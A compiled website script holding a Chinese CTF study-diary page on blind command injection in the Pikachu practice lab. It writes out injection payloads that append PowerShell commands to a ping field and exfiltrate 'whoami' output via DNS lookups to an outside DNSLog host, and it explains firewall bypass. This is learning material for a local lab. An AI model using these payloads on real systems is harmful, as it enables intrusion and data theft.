(window.webpackJsonp=window.webpackJsonp||[]).push([[192],{735:function(s,a,t){"use strict";t.r(a);var n=t(2),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("Boxx"),s._v(" "),a("p",[s._v("从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第56天")]),s._v(" "),a("p",[s._v("今日内容：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载")]),s._v(" "),a("p"),a("div",{staticClass:"table-of-contents"},[a("ul",[a("li",[a("a",{attrs:{href:"#防火墙出入站"}},[s._v("防火墙出入站")]),a("ul",[a("li",[a("a",{attrs:{href:"#实际案例3-数据不回显-icmp带外查询dnslog"}},[s._v("实际案例3：数据不回显-ICMP带外查询Dnslog")])])])]),a("li",[a("a",{attrs:{href:"#思维导图"}},[s._v("思维导图")])])])]),a("p"),s._v(" "),a("ul",[a("li",[s._v("小迪安全视频地址【"),a("RouterLink",{attrs:{to:"/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/"}},[s._v("🔗传送门")]),s._v("】")],1)]),s._v(" "),a("h1",{attrs:{id:"第24章-基础入门-反弹shell-带外查询-正反向连接-防火墙出入站-文件下载"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#第24章-基础入门-反弹shell-带外查询-正反向连接-防火墙出入站-文件下载"}},[s._v("#")]),s._v(" 第24章：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载")]),s._v(" "),a("h2",{attrs:{id:"防火墙出入站"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#防火墙出入站"}},[s._v("#")]),s._v(" 防火墙出入站")]),s._v(" "),a("p",[s._v("要控制对方，无非有两种方式，一是主动找他控制，另一种是对面把权限给你。看哪种方式可达。")]),s._v(" "),a("h3",{attrs:{id:"实际案例3-数据不回显-icmp带外查询dnslog"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#实际案例3-数据不回显-icmp带外查询dnslog"}},[s._v("#")]),s._v(" 实际案例3：数据不回显-ICMP带外查询Dnslog")]),s._v(" "),a("p",[s._v("在之前的情况下，我们在拼接命令后提交是能回显的，如下图所示：")]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20250114210150069.png",alt:"image-20250114210150069"}})]),s._v(" "),a("p",[s._v("我们修改一下源码，让他不回显，源码的路径如下"),a("code",[s._v("C:\\Tools\\phpstudy_pro\\WWW\\pikachu\\vul\\rce\\rce_ping.php")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20250114210529887.png",alt:"image-20250114210529887"}})]),s._v(" "),a("p",[s._v("我们将这行代码注释掉，"),a("code",[s._v("echo")]),s._v("是输出的意思。php代码的注释用的是"),a("code",[s._v("//")])]),s._v(" "),a("p",[s._v("此时不管我们是输入"),a("code",[s._v("127.0.0.1|whoami")]),s._v("还是"),a("code",[s._v("127.0.0.1")]),s._v("，都是没有回显的：")]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20250114210820722.png",alt:"image-20250114210820722"}})]),s._v(" "),a("h4",{attrs:{id:"总结"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[s._v("#")]),s._v(" "),a("strong",[s._v("总结：")])]),s._v(" "),a("p",[s._v("已知有漏洞，但是数据不回显：")]),s._v(" "),a("ol",[a("li",[s._v("我们可以尝试反弹Shell，将权限直接给出来")]),s._v(" "),a("li",[s._v("我们也可以带外查询，让他主动把结果给出来")])]),s._v(" "),a("h4",{attrs:{id:"原理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#原理"}},[s._v("#")]),s._v(" "),a("strong",[s._v("原理：")])]),s._v(" "),a("p",[s._v("找个DNSLog工具，每次ping该地址就会展示"),a("code",[s._v("DNS Query Record")]),s._v("即DNS查询记录、IP地址、创建时间，如下图所示：")]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20250114214614505.png",alt:"image-20250114214614505"}})]),s._v(" "),a("p",[s._v("此时我们在ping命令的域名上加上子域名，并且给子域名加上反引号，让反引号内部先执行，ping成功后即可得到结果：")]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20250114221541697.png",alt:"image-20250114221541697"}})]),s._v(" "),a("p",[s._v("但是，需要注意的是我们用的是Linux来进行的ping命令，而不是Windows，要知道在Windows中，cmd命令里是没有反引号先执行这条规定的，我们只能另辟蹊径，这里用到PowerShell来执行即可：")]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20250114223734005.png",alt:"image-20250114223734005"}})]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("C:\\Users\\19854>powershell\nWindows PowerShell\n版权所有 (C) Microsoft Corporation。保留所有权利。\n\n尝试新的跨平台 PowerShell https://aka.ms/pscore6\n\nPS C:\\Users\\19854> $x=whoami\nPS C:\\Users\\19854> echo $x\nlaptop-kl37dc4i\\19854\nPS C:\\Users\\19854> $x=whoami;$y='.northglory.eyes.sh';\nPS C:\\Users\\19854> echo $x;\nlaptop-kl37dc4i\\19854\nPS C:\\Users\\19854> echo $y;\n.northglory.eyes.sh\nPS C:\\Users\\19854> echo $x+$y\nlaptop-kl37dc4i\\19854+.northglory.eyes.sh\nPS C:\\Users\\19854> $z=$x+$y;\nPS C:\\Users\\19854> echo $z;\nlaptop-kl37dc4i\\19854.northglory.eyes.sh\nPS C:\\Users\\19854> ping $z;\nPing 请求找不到主机 laptop-kl37dc4i\\19854.northglory.eyes.sh。请检查该名称，然后重试。\nPS C:\\Users\\19854> $x1=$x.replace('\\','xxx');\nPS C:\\Users\\19854> echo $x1;\nlaptop-kl37dc4ixxx19854\nPS C:\\Users\\19854> $z=$x1+$y;\nPS C:\\Users\\19854> echo $z;\nlaptop-kl37dc4ixxx19854.northglory.eyes.sh\nPS C:\\Users\\19854> ping $z;\n\n正在 Ping laptop-kl37dc4ixxx19854.northglory.eyes.sh [172.104.163.125] 具有 32 字节的数据:\n来自 172.104.163.125 的回复: 字节=32 时间=107ms TTL=47\n来自 172.104.163.125 的回复: 字节=32 时间=125ms TTL=47\n\n172.104.163.125 的 Ping 统计信息:\n    数据包: 已发送 = 2，已接收 = 2，丢失 = 0 (0% 丢失)，\n往返行程的估计时间(以毫秒为单位):\n    最短 = 107ms，最长 = 125ms，平均 = 116ms\nControl-C\nPS C:\\Users\\19854>\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br")])]),a("p",[s._v("一开始ping不通是因为有反斜杠，我们用xxx替换了反斜杠，然后重新ping了一下，此时查看DNSLog页面，发现已经有了这条记录：")]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20250114223929523.png",alt:"image-20250114223929523"}})]),s._v(" "),a("p",[s._v("我们整理一下刚才PowerShell的语句：")]),s._v(" "),a("div",{staticClass:"language-powershell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-powershell"}},[a("code",[s._v("powershell "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$x")]),s._v("=whoami"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$x")]),s._v("="),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$x")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Replace"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'\\'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'xxx'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$y")]),s._v("="),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'.northglory.eyes.sh'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$z")]),s._v("="),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$x")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$y")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("ping "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$z")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h4",{attrs:{id:"为什么要这样写"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#为什么要这样写"}},[s._v("#")]),s._v(" "),a("strong",[s._v("为什么要这样写：")])]),s._v(" "),a("ol",[a("li",[a("p",[s._v("因为CMD里无法执行"),a("code",[s._v("whoami")]),s._v("，在ping命令中，无法完成反引号先执行，无法解析whoami")])]),s._v(" "),a("li",[a("p",[s._v("用到PowerShell变量赋值，把执行结果给变量")])]),s._v(" "),a("li",[a("p",[s._v('又由于结果里带符号"\\"，导致ping无法执行，所以要替换反引号为xxx')])])]),s._v(" "),a("h4",{attrs:{id:"步骤"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#步骤"}},[s._v("#")]),s._v(" "),a("strong",[s._v("步骤：")])]),s._v(" "),a("ol",[a("li",[a("p",[s._v("首先要考虑pikachu的这个ping漏洞是否能执行命令，我们可以输入以下内容尝试发送：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("127.0.0.1|ping northglory.eyes.io\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])]),s._v(" "),a("li",[a("p",[s._v("看到DNSLog平台上有回显，说明是能执行命令且能ping通的。")])]),s._v(" "),a("li",[a("p",[s._v("但由于是Windows系统的CMD是没有反引号先执行这条规则的，所以需要用到PowerShell的变量赋值，让"),a("code",[s._v("$x=whoami")]),s._v("，这句是核心，后边拼接"),a("code",[s._v(".northglory.eyes.s")])])]),s._v(" "),a("li",[a("p",[s._v("最后发现ping的时候，我们执行完"),a("code",[s._v("whoami")]),s._v("的结果有个反斜杠，导致ping命令不能执行了，这种情况只要把$x执行完"),a("code",[s._v("whoami")]),s._v("后再替换一下反斜杠即可。")])])]),s._v(" "),a("h4",{attrs:{id:"实践"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#实践"}},[s._v("#")]),s._v(" "),a("strong",[s._v("实践：")])]),s._v(" "),a("p",[s._v("用127.0.0.1和刚才的PowerShell命令做拼接，然后放到pikachu的漏洞中去实验，具体内容如下：")]),s._v(" "),a("div",{staticClass:"language-powershell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-powershell"}},[a("code",[s._v("127"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("|")]),s._v("powershell "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$x")]),s._v("=whoami"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$x")]),s._v("="),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$x")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Replace"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'\\'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'xxx'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$y")]),s._v("="),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'.northglory.eyes.sh'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$z")]),s._v("="),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$x")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$y")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("ping "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$z")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("如下图，我们在pikachu中点击提交以后，成功ping到了DNSlog平台，记录中展示了"),a("code",[s._v("whoami")]),s._v("的结果")]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20250114230040633.png",alt:"image-20250114230040633"}})]),s._v(" "),a("h4",{attrs:{id:"注意"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#注意"}},[s._v("#")]),s._v(" "),a("strong",[s._v("注意：")])]),s._v(" "),a("p",[s._v("仔细阅读刚才的PowerShell代码，要理解代码的执行顺序，先是"),a("code",[s._v("$x=whoami")]),s._v("的时候，就已经成功执行了，然后才做的替换，所以DNSLog有了后边我们的结果。")]),s._v(" "),a("p",[s._v("同理，我们不只是可以执行"),a("code",[s._v("whoami")]),s._v("，还有其他很多命令可以执行，比如"),a("code",[s._v("dir")]),s._v("是查看目录。")]),s._v(" "),a("h4",{attrs:{id:"思考"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#思考"}},[s._v("#")]),s._v(" "),a("strong",[s._v("思考：")])]),s._v(" "),a("p",[s._v("曾经遇到过Ping的CTF题目，但当时环境没有互联网，只能Ping本地，也就是127.0.0.1之类的地址，可能这种就不能用以上的方法了。只能用管道符这种最基础的命令拼接的形式，用不到反弹Shell和DNSLog带外回显了。")]),s._v(" "),a("h4",{attrs:{id:"网络协议"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络协议"}},[s._v("#")]),s._v(" "),a("strong",[s._v("网络协议：")])]),s._v(" "),a("p",[s._v("用反弹Shell需要考虑防火墙的问题，但Ping的解析，也就是利用PowerShell和DNSlog做带外回显能绕过防火墙")]),s._v(" "),a("p",[s._v("**原因：**ping命令走的ICMP协议，而防火墙禁用端口是控制TCP/UDP协议，也就是控制传输层，但是ICMP是网络层，是传输层下层，不受防火墙影响。所以可以使用ping命令将数据带出。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20250114232219279.png",alt:"image-20250114232219279"}})]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("课外知识：")])]),s._v(" "),a("p",[s._v("在连接互联网的情况下，不管Windows系统还是Linux系统都可以用以下命令查询互联网IP地址")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" ifconfig.me\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("安装本地工具：")])]),s._v(" "),a("p",[s._v("YAKIT（Yet Another Knife for IT Security）【"),a("a",{attrs:{href:"https://yaklang.com/",target:"_blank",rel:"noopener noreferrer"}},[s._v("官方网站"),a("OutboundLink")],1),s._v("】是一款网络安全单兵工具，专为个人渗透测试员和安全研究人员设计。它整合了一系列实用的安全工具，例如密码破解工具、网络扫描器、漏洞利用工具等，帮助用户在一个集中化的界面下执行常见的渗透测试任务。YAKIT通常轻便且易于携带，方便在需要快速响应的应急环境中使用。")])]),s._v(" "),a("h2",{attrs:{id:"思维导图"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#思维导图"}},[s._v("#")]),s._v(" 思维导图")]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20250119230234742.png",alt:"image-20250119230234742"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);